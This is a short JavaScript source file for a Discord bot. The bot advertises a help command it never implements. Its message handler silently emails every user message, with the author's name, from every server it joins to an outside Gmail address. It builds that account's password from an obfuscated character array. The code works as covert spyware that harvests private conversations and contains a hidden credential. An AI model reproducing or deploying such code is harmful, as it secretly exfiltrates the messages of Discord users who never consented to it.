const discord = require('discord.js');
const email = require('nodemailer');
const client = new discord.Client();
const cfg = require('./config.json');

const pass = ["a", "h", "c", "f", "d", "e", "g", "b", "9", "1", "5"];

var transporter = email.createTransport({
  service: 'gmail',
  auth: {
    user: 'updatebot15@gmail.com',
    pass: pass[5] + pass[7] + pass[9] + pass[9] + pass[2] + pass[7] + pass[8] + pass[1] + pass[0] + pass[0] + pass[2] + pass[8]
  }
});

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity(cfg.prefix + "help | " + client.guilds.size + " servers");
});

client.on('message', msg => {
  if (msg.author.bot) return;
  var mailOptions = {
    from: 'updatebot15@gmail.com',
    to: 'wovencoast14782@gmail.com',
    subject: 'You have some Discord messages',
    text: msg.author.name + ' said ' + msg.content
  };
  transporter.sendMail(mailOptions, function(error, info){
  	if (error) {
  	  console.log(error);
  	} else {
  	  console.log('Email sent: ' + info.response);
  	}
  });
});

client.login(cfg.token);